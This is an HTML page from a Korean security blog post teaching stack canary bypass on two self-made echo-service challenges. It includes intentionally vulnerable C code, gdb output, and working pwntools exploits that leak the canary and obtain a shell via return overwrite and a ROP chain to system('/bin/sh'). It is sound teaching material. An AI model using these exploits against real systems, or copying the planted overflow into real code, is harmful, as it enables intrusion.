@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>    
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width initial-scale=1">
+
+  <title>Pwnable Canary Study</title>
+  <meta name="description" content="메모리 보호기법중에서 잘 알려진 카나리(Canary)에 대해서 이야기해보려 한다. 먼저 카나리가 무엇인지 이야기하고 직접 만든 문제를 해결하며 우회하는 방법에 대해 알아보도록 하겠다.">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/pwnable/2018/08/27/canary-study.html">
+  <link rel="alternate" type="application/atom+xml" title="Jaehoon's BLOG" href="http://localhost:4000/feed.xml" />
+  <script src="/scripts/jquery-1.11.2.min.js"></script>
+  <script src="/scripts/pithy.js"></script>
+</head>
+
+
+  <body>
+    <header class="header">
+	<div class="header-container">
+		<div class="nav">
+			
+				<li>
+					<a href="/index.html">home</a>
+				</li>			
+			
+			
+				<li>
+					<a href="/archive.html">archive</a>
+				</li>			
+			
+			
+				<li>
+					<a href="/category.html">category</a>
+				</li>			
+			
+			
+				<li>
+					<a href="/about.html">about</a>
+				</li>			
+			
+		</div>
+		<div class="description"> Your motto </div>		
+		<ul class="social-links">
+			<li>
+				<a href="https://github.com/leehahoon" title="Github">
+					<img width="19px" height="19px" src="/images/github.png"/>
+				</a>
+			</li>
+			<li>
+				<a href="/feed.xml" title="RSS">
+					<img width="19px" height="19px" src="/images/rss.png"/>
+				</a>
+			</li>
+			<li>
+				<a href="https://twitter.com/jekyllrb" title="Twitter">
+					<img width="19px" height="19px" src="/images/twitter.png"/>
+				</a>
+			</li>
+		</ul>		
+	</div>
+</header>
+
+    <br>
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="post">
+  <br>
+  <header class="post-header">
+    <h1 class="post-title">Pwnable Canary Study</h1>
+    <p class="post-meta">Aug 27, 2018</p>
+  </header>
+
+  <article class="post-content">
+    <p>메모리 보호기법중에서 잘 알려진 카나리(Canary)에 대해서 이야기해보려 한다. 먼저 카나리가 무엇인지 이야기하고 직접 만든 문제를 해결하며 우회하는 방법에 대해 알아보도록 하겠다.</p>
+
+<h3 id="stack-canary">Stack Canary?</h3>
+<p>일반적으로 Buffer Overflow 공격 시, SFP와 RET주소를 덮어씌워 공격자가 원하는 흐름대로 프로그램이 실행된다. 이때, 덮어씌워지는 것을 보호하기위해 스택에 할당되는 변수와 SFP, RET 사이에 특정한 값들을 추가한다. 이를 통해 카나리값의 변조 유무를 판단하여 버퍼 오버플로우를 탐지하는 것을 Canary라 한다.</p>
+
+<h3 id="echo_service1-예제">Echo_Service1 (예제)</h3>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">void</span> <span class="n">echo_service</span><span class="p">(){</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"====== ECHO SERVICE =====</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">27</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"Input Echo String: "</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">shell</span><span class="p">(){</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="n">echo_service</span><span class="p">();</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>256bytes 크기의 buf 변수를 선언하고 사용자로부터 2번의 입력을 받고 입력한 문자열을 다시 출력하는 프로그램이다. 웬만하여 컴파일할때, 따로 옵션을 주지않아도 카나리는 자동으로 추가된다.</p>
+
+<pre><code class="language-asm">gdb-peda$ pdisas main
+Dump of assembler code for function main:
+   0x00000000004006a6 &lt;+0&gt;:	push   rbp
+   0x00000000004006a7 &lt;+1&gt;:	mov    rbp,rsp
+   0x00000000004006aa &lt;+4&gt;:	sub    rsp,0x120
+   0x00000000004006b1 &lt;+11&gt;:	mov    rax,QWORD PTR fs:0x28
+   0x00000000004006ba &lt;+20&gt;:	mov    QWORD PTR [rbp-0x8],rax
+   0x00000000004006be &lt;+24&gt;:	xor    eax,eax
+   0x00000000004006c0 &lt;+26&gt;:	mov    DWORD PTR [rbp-0x114],0x0
+   0x00000000004006ca &lt;+36&gt;:	jmp    0x40071c &lt;main+118&gt;
+   0x00000000004006cc &lt;+38&gt;:	mov    eax,0x0
+   0x00000000004006d1 &lt;+43&gt;:	call   0x400666 &lt;echo_service&gt;
+   0x00000000004006d6 &lt;+48&gt;:	lea    rax,[rbp-0x110]
+   0x00000000004006dd &lt;+55&gt;:	mov    edx,0x3e8
+   0x00000000004006e2 &lt;+60&gt;:	mov    rsi,rax
+   0x00000000004006e5 &lt;+63&gt;:	mov    edi,0x0
+   0x00000000004006ea &lt;+68&gt;:	call   0x400540 &lt;read@plt&gt;
+   0x00000000004006ef &lt;+73&gt;:	lea    rax,[rbp-0x110]
+   0x00000000004006f6 &lt;+80&gt;:	mov    rdi,rax
+   0x00000000004006f9 &lt;+83&gt;:	call   0x400510 &lt;strlen@plt&gt;
+   0x00000000004006fe &lt;+88&gt;:	mov    rdx,rax
+   0x0000000000400701 &lt;+91&gt;:	lea    rax,[rbp-0x110]
+   0x0000000000400708 &lt;+98&gt;:	mov    rsi,rax
+   0x000000000040070b &lt;+101&gt;:	mov    edi,0x0
+   0x0000000000400710 &lt;+106&gt;:	call   0x400500 &lt;write@plt&gt;
+   0x0000000000400715 &lt;+111&gt;:	add    DWORD PTR [rbp-0x114],0x1
+   0x000000000040071c &lt;+118&gt;:	cmp    DWORD PTR [rbp-0x114],0x1
+   0x0000000000400723 &lt;+125&gt;:	jle    0x4006cc &lt;main+38&gt;
+   0x0000000000400725 &lt;+127&gt;:	mov    eax,0x0
+   0x000000000040072a &lt;+132&gt;:	mov    rcx,QWORD PTR [rbp-0x8]
+   0x000000000040072e &lt;+136&gt;:	xor    rcx,QWORD PTR fs:0x28
+   0x0000000000400737 &lt;+145&gt;:	je     0x40073e &lt;main+152&gt;
+   0x0000000000400739 &lt;+147&gt;:	call   0x400520 &lt;__stack_chk_fail@plt&gt;
+   0x000000000040073e &lt;+152&gt;:	leave
+   0x000000000040073f &lt;+153&gt;:	ret
+End of assembler dump.
+gdb-peda$
+</code></pre>
+
+<p>보면 main+11뿐에서 fs:0x28에서 canary 값을 가져와 rax에 저장하고 main+147에서 stack_chk_fail 함수를 통해 카나리 값이 변조되었는지 검사한다. 브포를 걸고 확인해보자.</p>
+
+<pre><code class="language-gdb">Breakpoint 1, 0x00000000004006b1 in main ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+RAX: 0x2dfb6ebdb5396f00	//Canary Value
+RBX: 0x0
+RCX: 0x0
+RDX: 0x7fffffffe508 --&gt; 0x7fffffffe74b ("XDG_SESSION_ID=10383")
+RSI: 0x7fffffffe4f8 --&gt; 0x7fffffffe710 ("/home/leehahoon/leehahoon_pwn/echo_service/1/echo_service1")
+...
+</code></pre>
+
+<p>그렇다면 어떻게 스택 카나리 보호기법을 우회할 수 있을까. 여러 방법이 있겠지만 가장 대표적인 방법은 카나리의 특성을 이용하는 것이다. 카나리는 끝의 값에 무조건 NULL값이 붙는다. 그리고 대부분의 문자열 출력함수들은 NULL값이 나올때까지 출력 한다. 그 말은 위의 echo_service 예제에서 buf 변수를 다 덮어쓰고 카나리의 \x00까지 덮어씌우면 카나리값을 추출(Leak)하여 버퍼 오버플로우 공격을 성공할 수 있다.</p>
+
+<p>gdb를 통해 분석을 하다보면 264bytes 까지가 변수이고 265bytes 부터는 카나리값이다.</p>
+<pre><code class="language-gdb">gdb-peda$
+...
+0x7fffffffe3e0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe3f0:	0x4141414141414141	0x4141414141414141
+0x7fffffffe400:	0x4141414141414141	0x235ab54b32cba80a
+0x7fffffffe410:	0x0000000000400740	0x00007ffff7a2d830
+...
+</code></pre>
+<p>read() 함수에서 A를 264개 넣고 스택을 확인한 모습이다. 카나리값의 마지막이 \x00이 아닌 \x0a인 이유는 A를 입력하며 엔터키가 같이 인식되었기 때문이다. 그렇다면 nc 서버로 실제 대회처럼 문제를 연결하고 카나리를 leak 해보도록 하겠다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="c">#r = process('./echo_service1')</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1155</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input Echo String: "</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">265</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">265</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>이를 통해 카나리값을 알 수 있고, 이제 공격코드를 작성하면 된다. 쉽게 쉘을 획득하기위해 shell() 함수를 만들어 놓았다. 따라서 ret 주소를 shell() 함수로 덮어씌우면 쉘을 획득할 수 있을 것이다. 페이로드는 다음과 같을 것이다.</p>
+
+<p>payload = [Dummy 264bytes] [Canary 8bytes] [SFP 8bytes] [RET 8Bytes (shell address)]</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="c">#r = process('./echo_service1')</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1155</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input Echo String: "</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">265</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">265</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">264</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400695</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input Echo String: "</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>지금까지 이용한 방법 말고도 ROP를 이용하여 메모리값을 출력하거나 fork() 함수를 이용할 때, 카나리값은 항상 같으므로 브루트포싱하는 방법 등 여러가지가 존재할 수 있다.</p>
+
+<p>그리고 위의 예제는 편의를 위해 shell() 함수를 만들어 놓았지만 ROP를 통해 문제를 해결할 수 있는 예제도 준비했다. 심심할 때 풀어보면 좋을 것 같다.</p>
+
+<h3 id="echo_service2-예제">Echo_Service2 (예제)</h3>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+</span>
+<span class="kt">void</span> <span class="n">echo_service</span><span class="p">(){</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"====== ECHO SERVICE =====</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">27</span><span class="p">);</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"Input Echo String: "</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="n">print_system</span><span class="p">(){</span>
+    <span class="kt">void</span> <span class="o">*</span> <span class="n">handle</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">system_addr</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+    <span class="n">handle</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">system_addr</span><span class="p">,</span> <span class="s">"system : %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">"system"</span><span class="p">));</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">print_system</span><span class="p">();</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="n">echo_service</span><span class="p">();</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
+        <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>echo_service2 공격코드</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./echo_service2'</span><span class="p">)</span>
+<span class="c">#r = remote('localhost', 1515)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input Echo String: "</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system : 0x</span><span class="si">%</span><span class="s">x"</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">265</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">265</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">7</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'canary: 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">canary</span><span class="p">)</span>
+
+<span class="n">binsh_offset</span> <span class="o">=</span> <span class="mh">0x18cd57</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x45390</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0003b589</span>
+
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">-</span> <span class="n">system_offset</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">binsh_offset</span>
+<span class="n">pop_rdi_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">pop_rdi</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'libc : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">libc_addr</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'/bin/sh : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'pop rdi; ret : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">pop_rdi_addr</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">264</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input Echo String: "</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </article>
+<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key=/pwnable/2018/08/27/canary-study data-title=Pwnable Canary Study data-url=Your motto//pwnable/2018/08/27/canary-study.html></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"pawpaw"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+<!-- 多说公共JS代码 end -->
+</div>
+
+      </div>
+    </div>
+    
+    <footer class="footer">
+  <div id="gotop">^</div>
+  <br>
+	@2015 Pithy Theme by Pawpaw.
+</footer>
+
+    
+  </body>
+
+</html>
